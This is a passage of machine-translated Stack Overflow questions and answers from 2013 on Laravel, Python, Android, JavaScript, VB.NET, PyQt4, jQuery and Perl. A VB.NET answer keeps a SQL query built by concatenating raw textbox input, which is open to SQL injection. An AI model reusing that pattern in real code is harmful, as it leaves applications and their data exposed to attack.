你可能会说，“但我也想要整数支持！” 嗯，你明白了。你得到它没有任何“如果”陈述。所以要高兴，并且知道一堆编程语言（例如Javascript，Lua）也并不真正担心这种区别。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-08T03:59:49.947

我想我将生成所有采用相同指针数组的函数。

我将手动编写处理 0、1 或 2 个索引但使用宏生成数据类型的函数，例如

```
int readingfunc1(aline,arrofp){

return sscanf(aline,"%d XSTRFORMATDATATYPESLIST XSTRFORMATDATATYPESLIST", arrofp[2],arrofp[3])
//arrofp={arrofp[0], NULL, arrofp[2],arrofp[3]} 
```

func0 和 func2 视情况而定。

# php - 如何在身份验证之前在路由组上使用 Laravel 的通配符？

> ID：15262589
> 
> 赞同：0
> 
> 时间：2013-03-07T03:32:00.523
> 
> 标签：php, authentication, routing, routes, laravel

我的 router.php 中有以下代码

```
Route::group(array('before' => 'auth'), function() 
{
    Route::get('account/(:all?)', function() {});
    Route::get('facebook/(:all?)', function() {});
});

Route::controller(Controller::detect()); 
```

当用户未登录时，它工作得很好。但是一旦他成功登录并被重定向到请求的页面，页面就不会显示任何内容；只是一个空白页。我尝试使用 :any 而不是 :all 并且它做同样的事情。

任何人都可以识别问题吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-07T19:02:12.320

您的路线被映射到空的闭包。您需要返回一些东西或将它们映射到控制器。

```
Route::get('account/(:any?)', function() {
    return "Hello World";
});

Route::get('account/(:any?)', function() {
    return View::make('accounts.index');
});

//assuming you have an AccountController.php
Route::get('account/(:any?)', 'account@index');

//automatically route all methods of a controller
Route::controller('account'); 
```

查看[有关路由的 laravel 文档](http://laravel.com/docs/routing)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-12T23:51:07.233

显然，我没有找到使用组过滤器的更好解决方案。我现在将客人重定向到身份验证的方式是：

```
Route::filter('before', function()
{
    $open_routes = array(
        '', 
        'home', 
        'auth', 
        'help'
    );
    if(!in_array(URI::segment(1), $open_routes) && Auth::guest()) {
        return Redirect::to('/auth/login');
    }
}); 
```

# python - 为什么 Python 在我的字符串中的数字前显示撇号？

> ID：15262591
> 
> 赞同：0
> 
> 时间：2013-03-07T03:32:01.893
> 
> 标签：python

我正在编写一个程序来根据来自谷歌电子表格的数据为一个家庭创建一个目录条目。其中一个功能是列出家庭中的所有孩子以及他们的生日。但是，该程序在生日之前无缘无故地打印一个撇号，例如'01/01/01，我不知道为什么。我已将生日的数据转换为字符串，而我的其他字符串没有这样做。为什么会这样？

以下是源代码的相关部分：

```
 import gspread
    gc =gspread.login('mylogin','password')
    spreadsheet = gc.open_by_key("mykey")
    worksheet = spreadsheet.get_worksheet(0)
    Child1=(worksheet.cell(x,13)).value
    Child1BD=(worksheet.cell(x,14)).value
    Child2=(worksheet.cell(x,15)).value
    Child2BD=(worksheet.cell(x,16)).value
    Child3=(worksheet.cell(x,17)).value
    Child3BD=(worksheet.cell(x,18)).value
    Child4=(worksheet.cell(x,19)).value
    Child4BD=(worksheet.cell(x,20)).value
    # If there are no children, return without doing anything.
    if Child1 == "n/a":
        return;
    # If there is one child only, print the child's name and birthday.
    elif Child2 == "n/a" and Child1 != "n/a":
        print str(Child1)+"- "+str(Child1BD)
        return;
    # If thre are exactly two children, print their names and birthdays.
    elif Child3 == "n/a" and Child2 != "n/a":
        print str(Child1)+"- "+str(Child1BD)
        print str(Child2) +"- "+str(Child2BD)
        return;
    # If there are exactly three children, print their names and birthdays.
    elif Child4 == "n/a" and Child3 != "n/a":
        print str(Child1)+"- "+str(Child1BD)
        print str(Child2) +"- "+str(Child2BD)
        print str(Child3) +"- "+str(Child3BD)
        return;
    # If there are four children, print their names and birthdays.
    elif Child4 != "n/a":
        print str(Child1)+"- "+str(Child1BD)
        print str(Child2) +"- "+str(Child2BD)
        print str(Child3) +"- "+str(Child3BD)
        print str(Child4) +"- "+str(Child4BD)
        return; 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-07T03:35:40.590

这就是 Excel 在内部存储字符串的方式。您必须在打印之前将其删除。

撇号表示它是字符串而不是数字。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-07T03:48:11.517

`'`用于 excel 以防止它尝试猜测单元格的格式。例如，如果您想防止单元格自动转换为日期，您可以`'`在`01/01/2013`

如果您不知道字符串的来源，最好在前面加上 a`'`以防止这种神奇的（可能令人困惑的）重新格式化

正如 Mark 所说，在 Google 电子表格中保持兼容可能是相同的

一般来说，剥离`'`掉以获取显示的字符串应该是安全的，只是要小心将未转义的字符串放回电子表格中

# android - 在android中使用keyczar

> ID：15262595
> 
> 赞同：3
> 
> 时间：2013-03-07T03:32:27.747
> 
> 标签：android, encryption, cryptography, salt, keyczar

我正在研究使我的用户数据对 android 安全。我遇到了keyczar。我找到了 由 Kenny Root 提供的[android-keyczar-demo ，他](https://github.com/kruton/android-keyczar-demo)[在 google-IO 发表了关于 android 安全性的演讲](http://youtu.be/RPJENzweI-A?t=32m41s)。但是我有一个唠叨的问题。既然密钥是封装在应用程序中的，那么恶意用户是不是也可以使用该密钥来解密敏感数据呢？从keyczar doc来看，keyczarTool是一个创建密钥的命令行工具，所以看起来它不是要打包在应用程序中的吗？我注意到 keyczar 的密钥可以受[密码保护](http://code.google.com/p/keyczar/wiki/CppTutorial#Using_PBE_%28password-based_encryption%29_to_encrypt_keys)。然而，它又回到了在源代码中对密码进行硬编码。我在这里想了解什么？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-07T13:38:20.243

您缺少的是，如果您还希望这些相同的用户能够解密，则您无法在语义上对用户保密。这就是为什么 DRM 永远不会起作用的原因。

keyczar 拥有 keytool 的原因是安全性的一个重要部分是随着时间的推移更改您的密钥，因此 keyczar 提供了一种在不破坏功能的情况下轮换密钥的方法。

PBE 密钥集在那里，以便用户可以输入密码进行解密，它绝对不是硬编码的。这样，给定应用程序的密钥集，您可以通过要求您的用户输入密码来保护数据免受攻击，同时为您的用户提供解密。（不幸的是，此功能仅存在于 keyczar 的 C++、Go 和 C# 版本中——目前不存在于 java 版本中）。

此外，如果您不希望每个用户都拥有相同的密钥，则不必将密钥集包含在您的应用程序中，您也可以生成它安装。但是移动领域的加密是困难的，如果不知道你在做什么，如果你可以保护你想要的东西或者 keyczar 是否合适的话，很难说。

# javascript - 从 Google 表格循环

> ID：15262598
> 
> 赞同：1
> 
> 时间：2013-03-07T03:32:44.503
> 
> 标签：javascript, loops, google-visualization

我正在尝试从 Google 工作表中执行一个循环，从而用 a0、a1、a2 等从它中出来。我可以手动设置变量，但无法正确循环。

```
google.load('visualization', '1', {
    packages: ['gauge']
});
google.setOnLoadCallback(queryValue);

function queryValue() {
    var query = new google.visualization.Query('https://spreadsheets.google.com/spreadsheet/tq?range=B22:B37&key=0AhCv9Xu_eRnSdFNhSzNQUFd3b1ZfRHgtQURINFpzeGc&gid=7');
    query.send(function (response) {
        if (response.isError()) {
            alert('Error in query: ' + response.getMessage() + ' ' + response.getDetailedMessage());
            return;
        }
        var data = response.getDataTable();

        //date label loop
        for (var i = 0; i <= 15; i++) {
            document.getElementById('b' + (i + 22)).innerHTML = data.getValue(i, 0);
            console.log("i =" + b22)
        }

    });
    queryValue1()
}

function queryValue1() {
    var query = new google.visualization.Query('https://spreadsheets.google.com/spreadsheet/tq?range=A22:A37&key=0AhCv9Xu_eRnSdFNhSzNQUFd3b1ZfRHgtQURINFpzeGc&gid=7');
    query.send(function (response) {
        if (response.isError()) {
            alert('Error in query: ' + response.getMessage() + ' ' + response.getDetailedMessage());
            return;
        }
        var data1 = response.getDataTable();
        var a1 = data1.getValue(0, 0);
        var a2 = data1.getValue(1, 0);
        var a3 = data1.getValue(2, 0);
        var a4 = data1.getValue(3, 0);
        var a5 = data1.getValue(4, 0);
        var a6 = data1.getValue(5, 0);
        var a7 = data1.getValue(6, 0);
        var a8 = data1.getValue(7, 0);
        var a9 = data1.getValue(8, 0);
        var a10 = data1.getValue(9, 0);
        var a11 = data1.getValue(10, 0);
        var a12 = data1.getValue(11, 0);
        var a13 = data1.getValue(12, 0);
        var a14 = data1.getValue(13, 0);
        var a15 = data1.getValue(14, 0);
        var a16 = data1.getValue(15, 0);

        queryValue3(a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11, a12, a13, a14, a15, a16);
    });

}

function queryValue3(met1, met2, met3, met4, met5, met6, met7, met8, met9, met10, met11, met12, met13, met14, met15, met16) {
    var query3 = new google.visualization.Query('https://spreadsheets.google.com/spreadsheet/tq?range=B2:B17&key=0AhCv9Xu_eRnSdFNhSzNQUFd3b1ZfRHgtQURINFpzeGc&gid=10');
    query3.send(function (response) {
        if (response.isError()) {
            alert('Error in query3: ' + response.getMessage() + ' ' + response.getDetailedMessage());
            return;
        }

        var data3 = response.getDataTable();

        var m1 = data3.getValue(0, 0);
        var m2 = data3.getValue(1, 0);
        var m3 = data3.getValue(2, 0);
        var m4 = data3.getValue(3, 0);
        var m5 = data3.getValue(4, 0);
        var m6 = data3.getValue(5, 0);
        var m7 = data3.getValue(6, 0);
        var m8 = data3.getValue(7, 0);
        var m9 = data3.getValue(8, 0);
        var m10 = data3.getValue(9, 0);
        var m11 = data3.getValue(10, 0);
        var m12 = data3.getValue(11, 0);
        var m13 = data3.getValue(12, 0);
        var m14 = data3.getValue(13, 0);
        var m15 = data3.getValue(14, 0);
        var m16 = data3.getValue(15, 0);

        var red22 = "<span style='color:#ff0000'> ";
        var yellow22 = "<span style='color:#FF9900'> ";
        var green22 = "<span style='color:#009900'> "; 
```

此代码查询 Google 表格并在页面上绘制 16 个仪表，动态更改记录数据的月份，仪表上的标签更改颜色以匹配仪表上的颜色，红色、黄色或绿色。 [这是页面](http://landash.com/samples/gauges7.html)

如您所见，我还有一些改进的余地。我已经设法让这一切正常工作，但我缩短了几个循环。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-07T04:21:37.417

我认为返回数组而不是变量会更有效。

像这样的东西：

```
var a = [];
for (var z = 0; z <= 15; z++) {
  a[z] = data1.getValue(z, 0);
} 
```

要获取 a0、a1、a2 等的值，您只需使用 a[0]、a[1]、a[2] 等。

# java - 如何在列表视图中创建按钮，如果我点击它必须打开一个活动？

> ID：15262602
> 
> 赞同：0
> 
> 时间：2013-03-07T03:33:09.933
> 
> 标签：java, android

我也有一个带有图像和链接功能的列表视图，现在我需要的是我想在列表视图中的每个项目中创建一个按钮，如果我单击按钮它必须进行另一个活动，在该活动页面中它必须单击按钮分别打开一个xml文件，我将预先在列表视图java文件中硬编码xml文件的详细信息，如何做到这一点。

```
public class SouthIndianvegrecipes  extends Activity {

 @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main1);

        ArrayList<Recipedetails1> image_details = GetSearchResults();

        final ListView lv1 = (ListView) findViewById(R.id.listV1_main);
        lv1.setAdapter(new ItemListBaseAdapter1(this, image_details));

        lv1.setOnItemClickListener(new OnItemClickListener() {
            @Override
            public void onItemClick(AdapterView<?> a, View v, int position, long id) { 
                Object o = lv1.getItemAtPosition(position);
                Recipedetails1 obj_itemDetails = (Recipedetails1)o;
                Toast.makeText(SouthIndianvegrecipes.this, "You have chosen : " + " " + obj_itemDetails.getName1(), Toast.LENGTH_LONG).show();

            } 
        });
    }

    private ArrayList<Recipedetails1> GetSearchResults(){
        ArrayList<Recipedetails1> results = new ArrayList<Recipedetails1>();

        Recipedetails1 item_details = new Recipedetails1();
        item_details.setName1("Vegterian");
        item_details.setItemDescription1("Recipes made by raw materials");
        item_details.setUrlWiki("https://www.youtube.com/watch?v=C_r0mFvMSfU");
        item_details.setImageNumber1(1);
        results.add(item_details);

        item_details = new Recipedetails1();
        item_details.setName1("Non-Vegterian");
        item_details.setItemDescription1("Flesh of sweet animals");
        item_details.setUrlWiki("https://www.youtube.com/watch?v=C_r0mFvMSfU");
        item_details.setImageNumber1(2);
        results.add(item_details);

        item_details = new Recipedetails1();
        item_details.setName1("Pickels");
        item_details.setItemDescription1("Touchable dish  by Homemade");
        item_details.setUrlWiki("https://www.youtube.com/watch?v=C_r0mFvMSfU");
        item_details.setImageNumber1(3);
        results.add(item_details);

        item_details = new Recipedetails1();
        item_details.setName1("Soups");
        item_details.setItemDescription1("Startup for our food");
        item_details.setUrlWiki("https://www.youtube.com/watch?v=C_r0mFvMSfU");
        item_details.setImageNumber1(4);
        results.add(item_details);

        return results;
    } 
```

}

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-07T04:41:56.990

您只需要像这样在 ItemListBaseAdapter1 的 getView() 方法中为按钮设置 OnClickListener 。

```
 class ItemListBaseAdapter1 extends BaseAdapter
    {

    private Activity mActivity;
    public ItemListBaseAdapter1(Activity activity, ...)
    {
        mActivity = activity;
    }

    @Override
    public View getView(int position, View convertView, ViewGroup parent)
    {
        // TODO: get view here
        final Recipedetails1 item = (Recipedetails1) getItem(position);
        theButton.setOnClickListener(new OnClickListener() {

            @Override
            public void onClick(View v)
            {
                Intent intent = new Intent(mActivity, [your activity class]);
                intent.putExtra("The Link Key", item.getUrlWiki());
                mActivity.startActivity(intent);
            }
        });
        return view;
    }

} 
```

在目标活动上，您可以通过以下方式获得链接：

```
@Override
protected void onCreate(Bundle savedInstanceState)
{
    super.onCreate(savedInstanceState);
    String link = getIntent.getString("The Link Key", null);
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-07T04:51:11.640

正如您所说，您在列表的列表项中有一个按钮。如您所知，在按钮单击侦听器上，您在 onclicklistener 方法中获得了视图

新的 OnClickListener()
{
@Override
public void onClick(View view)
{}
}

这里 view 有一个 getparent() 方法，它会返回一个设置了按钮的视图。您可以通过在日志中打印来检查它。如果您有按钮的父级，那么您还可以获得父级的所有子视图，其中 1 个子视图是按钮。从所有子视图中，您可以获得在下一个活动中发送它们的值。如果按钮的父级在列表项视图中有另一个父级，那么您也可以通过调用 getparent() 方法来获取父级视图的父级。

请记住，视图有父子关系，所以如果你想要所有的孩子，那么你必须得到父母。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-07T03:45:41.903

你需要添加`android:descendantFocusability="blocksDescendants"`

我刚刚从这里找到了解决方案

[https://stackoverflow.com/a/14372750/1136023](https://stackoverflow.com/a/14372750/1136023)

用它来传递你的包含`intent.putExtra("TAG", Data);`

# vb.net - 如何将 Max Function Textbox1 绑定到 Textbox2？

> ID：15262603
> 
> 赞同：0
> 
> 时间：2013-03-07T03:33:15.840
> 
> 标签：vb.net, visual-studio-2008, data-binding, binding, textbox

我使用 vb.net 2008，我想将 txtEmpNo 绑定到 txtRate。但我检查了专栏是正确的。

**错误**“无法绑定到 DataSource 上的属性或列 Rate。参数名称：dataMember”

**此代码：**

```
Private Sub txtEmpNo_KeyPress(ByVal sender As System.Object, ByVal e As System.Windows.Forms.KeyPressEventArgs) Handles txtEmpNo.KeyPress
        Dim da3 As New SqlDataAdapter
        Dim ds3 As New DataSet()

        Dim sqlRate As String = "SELECT Max(Rate) From EmployeeSalary WHERE EmployeeRun = '" & txtEmpNo.Text.ToString & "'"
        da3 = New SqlDataAdapter(sqlRate, Conn)
        da3.Fill(ds3, "EmployeeRun")
        If ds3.Tables("EmployeeRun").Rows.Count > 0 Then
            txtRate.DataBindings.Add(New Binding("Text", ds3.Tables("EmployeeRun"), "Rate"))
            txtRate.DataBindings.Clear()
        Else
            txtRate.Text = ""
        End If
    End Sub 
```

谢谢你的时间。:)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-07T03:36:44.493

请检查您的查询，将费率别名设置为`max(rate)`

改变：

```
 Dim sqlRate As String = "SELECT Max(Rate) From EmployeeSalary WHERE EmployeeRun = '" & txtEmpNo.Text.ToString & "'" 
```

如果您执行此查询，结果将是

```
|(No ColumnName)|
| max rate value| 
```

到

```
 Dim sqlRate As String = "SELECT Max(Rate) as Rate From EmployeeSalary WHERE EmployeeRun = '" & txtEmpNo.Text.ToString & "'" 
```

这将显示

```
|Rate           |
|max rate value | 
```

最好的祝福

# python - PyQt4 QSqlTableModel、QTableView间歇性更新

> ID：15262614
> 
> 赞同：0
> 
> 时间：2013-03-07T03:34:54.890
> 
> 标签：python, mysql, pyqt4

我有一个非常奇怪的错误，我似乎无法诊断。

我有一个 PyQt4 应用程序，它使用 QSqlTableModel 在 QTableView 中显示数据。我在一个独立的程序中重复了这个错误，如下所示。当我运行程序时，大多数单元格/列都是可编辑的并更改数据库。但是，由于某种原因（这次我运行它时）第 5 行不可编辑。有问题的行似乎发生了变化。

关于如何进一步调试有什么建议吗？我已经覆盖了 setData 方法，它的行为符合预期。它传递新值，父 setData 返回 True；但是，数据库没有改变，tableView 恢复到旧数据。

**编辑**：怀疑这可能是 PyQt4 错误，我安装了最新的 PyQt4（4.10 版）。这似乎并没有改变问题的行为。我还注意到我没有包括我的数据库类。我已经更新了代码清单以包含 DB 类。它从配置文件中提取数据库连接信息。基本上，它只是使用 MySQL5 服务器后端。

```
class Database:
    def __init__(self, parent = None):
        print "Opening database connection."
        self.data = QtSql.QSqlDatabase.addDatabase("QMYSQL")
        self.data.setHostName(parent.config.get('Database','mysql_server'))
        self.data.setPort(int(parent.config.get('Database','mysql_port')))
        self.data.setDatabaseName(parent.config.get('Database','mysql_database'))
        self.data.setUserName(parent.config.get('Database','mysql_user'))
        self.data.setPassword(parent.config.get('Database','mysql_pass'))

        if not self.data.open() :
            print "error opening database"
            print self.data.lastError().text()

        print "database init complete"

class Model(QtSql.QSqlTableModel):

    def __init__(self, prjID, parent = None):
        super(Model, self).__init__(parent)
        self.setEditStrategy(QtSql.QSqlTableModel.OnRowChange)

        self.setTable("Debug")

        self.setFilter("PrjID = " + str(prjID))

        if not self.select() :
            print "error, ", self.lastError().text()

class Main(QtGui.QMainWindow) :
    def __init__(self) :
        QtGui.QMainWindow.__init__(self)

        self.config = ConfigParser.ConfigParser()
        self.config.read("default.cfg")
        self.db = Database(self)
        self.model = Model(39,self)        
        self.tableView = QtGui.QTableView(self)
        self.tableView.setGeometry(0,0,4000,400)

        self.tableView.setModel(self.model)

if __name__ == "__main__":
    import sys
    app = QtGui.QApplication(sys.argv)
    MainWindow = Main()  #QtGui.QMainWindow()
    #ui = Ui_MainWindow()
    #ui.setupUi(MainWindow)
    MainWindow.show()
    sys.exit(app.exec_()) 
```

这是我创建的调试表。如上所示，我的后端数据库是 MySQL。我可能在定义此表的方式上做错了什么吗？：

```
CREATE TABLE IF NOT EXISTS `Debug` (
  `ID` int(11) NOT NULL AUTO_INCREMENT,
  `PrjID` int(11) DEFAULT NULL,
  `WorkType` int(11) DEFAULT NULL,
  `Qty` double DEFAULT NULL,
  `UnitCost` double DEFAULT NULL,
  `Note` varchar(256) DEFAULT NULL,
  `ShowDetail` tinyint(1) NOT NULL,
  `SubTotal` float DEFAULT NULL,
  UNIQUE KEY `ID` (`ID`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1 AUTO_INCREMENT=101 ;

--
-- Dumping data for table `Debug`
--

INSERT INTO `Debug` (`ID`, `PrjID`, `WorkType`, `Qty`, `UnitCost`, `Note`, `ShowDetail`, `SubTotal`) VALUES
(1, 37, 10, 66, 1, 'asdfasdf', 1, 66),
(2, 37, 7, 22, 2, 'asdfasdf', 1, 44),
(3, 37, 11, 11, 33, 'asdfasdf', 1, 363),
(4, 37, 7, 1, 10, 'asdfasdf', 1, 10),
(5, 37, 10, NULL, NULL, 'aa', 0, NULL),
(100, 39, 6, 8, 10, 'aa', 0, 80),
(6, 38, 10, 2151, 0.20000000298, NULL, 0, 430.2),
(7, 38, 27, 120.25, 0, '123', 1, 0),
(8, 38, 22, 5.69, 5, NULL, 0, 28.45),
(9, 38, 7, 3, 35, NULL, 1, 105),
(11, 39, 1, 6, 35, 'aa', 0, 210),
(12, 39, 17, 17.78842, 6.5, 'zz', 0, 115.625),
(13, 39, 27, 147.944803, 0, 'zz', 0, 0),
(14, 39, 28, 82.17064, 15, NULL, 0, 1232.56),
(15, 39, 30, 64.42334, 0, 'aa', 0, 0); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-08T04:27:48.730

**可能的解释：**我想出的东西很少。我认为我的基本问题是我的表没有定义主键。当我使用 PRIMARY KEY 而不是 UNIQUE KEY 创建表时，问题就消失了。

就 PyQt4 而言，我还了解到我需要使用 QTableView 的 setColumnHidden 方法而不是 QSqlTableModel 的 removeColumn 来隐藏列（例如 ID 列）。一旦 ID 列（主键）被删除，那么更新就会变得很糟糕。

我还确定如果我正在使用视图（授予该视图必须是 MySQL 要求的可编辑），我必须手动设置 QSqlTableModel 中的主键。例如：

```
pk = QtSql.QSqlIndex("cursName","idxName")
pk.append(QtSql.QSqlField("ID"))
self.setPrimaryKey(pk) 
```

# xcode - 在 Xcode 4 中向多个目标添加框架

> ID：15262615
> 
> 赞同：0
> 
> 时间：2013-03-07T03:34:55.333
> 
> 标签：xcode, frameworks

我正在尝试将现有框架添加到我项目中的第二个目标。

我通过 Build Phases-> Link Binary With Libraries -> Add Target 添加了它。

但是当我尝试从框架导入 .h 文件或使其成为第二个目标的超类时，找不到 .h 文件。

第一个目标没有问题，但只有第二个目标有。

我搜索了 3 个小时，但找不到解决方案。

有人知道怎么做吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-07T04:36:21.267

我假设 Xcode 4？该框架应该列在项目层次结构树的左侧某处。如果您选择它，然后在右侧的 Target Membership 下，选择您希望它包含在其中的第二个目标。

# jquery - 彩盒不会关闭

> ID：15262616
> 
> 赞同：1
> 
> 时间：2013-03-07T03:34:56.810
> 
> 标签：jquery, colorbox

我正在使用 colorbox 替换thickbox，并且我在所有其他脚本中都取得了成功，但是我有一个实例，我的所有代码都在执行，除了它不会关闭 colorbox。预先感谢您的帮助！

这是代码：

```
 function submit_data () {
        var primary_site = $('#primary_site').val();
        var primary_site_text = $('#primary_site option:selected').text();
        var rental_unit = $('#id', top.document).val();
        var id = $('#id').val();
        var mgdc = $('#mgdc:checked').val();
        var scrape_calendar = $('#scrape_calendar:checked').val();
        var listing_id = $('#listing_id').val();
        var exp_date = $('#exp_date').val();
        var last_cost = $('#last_cost').val();
        var add_ons = $('#add_ons').val();
        var notes = $('#notes').val();
        var third_party_marketing_id = <?php echo $third_party_marketing_id ?>;
        var no_scrape_calendar_text = '';
        var yes_scrape_calendar_text = 'SCRAPE';

        if (mgdc == 'on') {
            var mgdc = 1;
            var mgdc_text = 'MGDC';
        } else {
            var mgdc = 0;
            var mgdc_text = '';
        }
        if (scrape_calendar == 'on') {
            var scrape_calendar = 1;
            var scrape_calendar_text = yes_scrape_calendar_text;
        } else {
            var scrape_calendar = 0;
            var scrape_calendar_text = no_scrape_calendar_text;
        }

        $.post("ajax_add_edit_third_party_marketing.php", { third_party_marketing_id: third_party_marketing_id, rental_unit: rental_unit, id: id, mgdc: mgdc, listing_id: listing_id, primary_site: primary_site, exp_date: exp_date, last_cost: last_cost, add_ons: add_ons, notes: notes, scrape_calendar: scrape_calendar },

        function(data) { 
            var new_line_html = '<tr><td>' + mgdc_text + '</td> <td>&nbsp;</td> <td>' + primary_site_text + '</td> <td>&nbsp;</td> <td>' + listing_id + '</td> <td>&nbsp;</td> <td>' + add_ons + '</td> <td>&nbsp;</td> <td>' + scrape_calendar_text + '</td> <td>&nbsp;</td> <td>&nbsp;</td></tr>';
            var third_party_marketing_div_id = '#third_party_marketing_' + third_party_marketing_id;

            if (scrape_calendar == 1){
                $('[id="tpm_scrape"]', top.document).replaceWith(no_scrape_calendar_text);
            }

            if (third_party_marketing_id == 0){
                $('#third_party_marketing_widget_table > tbody:last', top.document).append(new_line_html);
            } else {
                $(third_party_marketing_div_id, top.document).replaceWith(new_line_html);
            }
            $.colorbox.close(); // this isn't working??
        });
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-07T03:42:37.263

您正在调用错误的函数。

它应该是

```
$.colorbox.close(); 
```

没有第一个'()'；

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-07T05:20:48.653

尝试改变：

```
$.colorbox.close(); 
```

至

```
$.fn.colorbox.close(); 
```

# asp.net-mvc - 在 AppHarbor 上成功部署后出现 500 错误

> ID：15262617
> 
> 赞同：0
> 
> 时间：2013-03-07T03:35:05.767
> 
> 标签：asp.net-mvc, appharbor

我已经在 appharbor 上部署了我的应用程序，但我不断收到 500 错误，其中包含以下详细信息：

> 模块：ManagedPipelineHandler 通知：ExecuteRequestHandler
> 
> 处理程序：System.Web.Mvc.MvcHandler 错误代码：0x00000000 已请求
> 
> 网址： [http ://camelotfaultmanagement.apphb.com:19109/Faults/FaultManagement](http://camelotfaultmanagement.apphb.com:19109/Faults/FaultManagement)
> 
> 物理路径：D:\websites\f3\33091\19109\0x0001_PublishedWebsites\CamelotFaultManagement\Faults\FaultManagement
> 
> 登录方式：匿名
> 
> 登录用户：匿名

这是应用程序链接：[http ://camelotfaultmanagement.apphb.com/Faults/FaultManagement](http://camelotfaultmanagement.apphb.com/Faults/FaultManagement)

我没有下载构建结果并将它们本地部署在我机器的 IIS 上以尝试调试，但是当我将网站和应用程序池设置为 .NET 4 时，一切都立即上升 - 集成。

什么可能导致错误？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-07T06:06:56.877

我发现了问题！那是实体框架连接字符串的别名。在 AppHarbor SQL 插件中，我必须提供与我在我的中使用的相同的别名，并且有一个错字。

# perl - 数组：Foreach

> ID：15262632
> 
> 赞同：-4
> 
> 时间：2013-03-07T03:36:48.827
> 
> 标签：perl

我有以下内容：

```
my $v = "value";
my $v1 = "value";
my @v2 = ("v3", v4"); 
```

我怎样才能拥有一个包含 v、v1 和 v2 元素的 foreach？类似于：

```
foreach my $element ($v, $v1, @v2) {
 # Do something with the element. 
} 
```

本质上我希望它相当于

```
foreach my $element ($v, $v1, $v3, $v4) {

} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-07T04:03:55.050

```
foreach my $element ($v, $v1, @v2) { ... } 
```

相当于

```
foreach my $element ($v, $v1, $v2[0], $v2[1], ..., $v2[$#v2]) { ... } 
```

这似乎正是您想要的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-07T04:05:04.957

但是，您的问题有点不清楚-如果您的意思是：**我有一个 foreach 将包含 v, v1 和 v2 的元素**，那么这就是您要做的（用您的符号表示）：

```
my $v = "value1";
my $v1 = "value2";
my @v2 = ("v3", "v4");

foreach my $element($v, $v1, @v2) {
    print $element . "\n";
} 
```

这将为您提供输出：

```
value1
value2
v3
v4 
```

这是如何运作的？**foreach 循环通过将控制变量 (VAR) 设置为列表的每个连续元素来迭代值列表：**

```
foreach VAR (LIST) {
    ...
} 
```

在您的情况下，控制变量名称是**$element**，列表及其值是：**($v, $v1, @v2)** - 或者，*更明确地*说：**("value1", "value2", "@v2[0 ]", "@v2[1]") - 可以被认为是 - （但不是真的）以下内容： ("value1", "value2", "v3", "v4")**。

而且，根据 ikegami 的警告，仅供参考：**如果您在循环中修改 $element 值，则列表中保存的值将依次被修改。**

# regex - 停留在以空格结尾的字符串的 perl 正则表达式

> ID：15262638
> 
> 赞同：0
> 
> 时间：2013-03-07T03:37:15.617
> 
> 标签：regex, perl

以下是 ftp 日志中的一行：

> 2013-03-05 18:37:31 543.21.12.22 [] 发送 /home/mydomain/public_html/court-9746hd/Chairman-confidential-video.mpeg 226 court-9746hd@mydomain.com 256

我正在使用一个名为 Simple Event Correlate 的程序，它从正则表达式的括号内提取值并将这些值设置为变量。

因此，这是 SEC 配置文件中的一个条目，它应该在前一个日志文件行上运行：

```
 pattern=sent \/home\/mydomain\/public_html\/(.*)\/(.*) 
```

这成功地拉出登录用户，`court-9746hd`并将其设置为变量，但无法正确提取下载的文件名，或者，`Chairman-confidential-video.mpeg`

相反，它会将下载的文件提取为：`Chairman-confidential-video.mpeg 226 court-9746hd@mydomain.com 256`

所以你看，我很难让第二次提取停止在文件名后面的第一个空格处。我试过了：

```
 pattern=sent \/home\/mydomain\/public_html\/(.*)\/(.*)\s 
```

但我只得到相同的结果。任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-07T03:42:33.940

如果您只想匹配非空格，请替换`.*`为`\S*`or 如果空格是您要排除的唯一字符，则`[^ ]*`改为使用。

另外，`man perlre`是一个很好的参考。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-07T03:44:11.787

作为一般规则，不要使用 .* 构造，而是使用范围更窄的东西。在这种情况下，您想要的是不是空白的东西，所以明确地说：

```
pattern=sent \/home\/mydomain\/public_html\/([^\s]+)\/([^\s]+) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-07T04:19:08.970

一种选择是首先从该行捕获完整路径，然后使用[File::Spec](http://perldoc.perl.org/File/Spec.html)获取用户和文件信息：

```
use strict;
use warnings;
use File::Spec;

my $line = '2013-03-05 18:37:31 543.21.12.22 []sent /home/mydomain/public_html/court-9746hd/Chairman-confidential-video.mpeg 226 court-9746hd@mydomain.com 256';
my ( $path ) = $line =~ m!\s+(/home\S+)\s+!;
my ( $user, $file ) = ( File::Spec->splitdir($path) )[ -2, -1 ];

print "User: $user\nFile: $file"; 
```

输出：

```
User: court-9746hd
File: Chairman-confidential-video.mpeg 
```

但是，如果您只想使用正则表达式，则以下内容将起作用：

```
m!/home/.+/.+/([^/]+)/(\S+)! 
```

# php - AJAX，JSON 对象 404

> ID：15262639
> 
> 赞同：0
> 
> 时间：2013-03-07T03:37:31.803
> 
> 标签：php, javascript, jquery, ajax, json

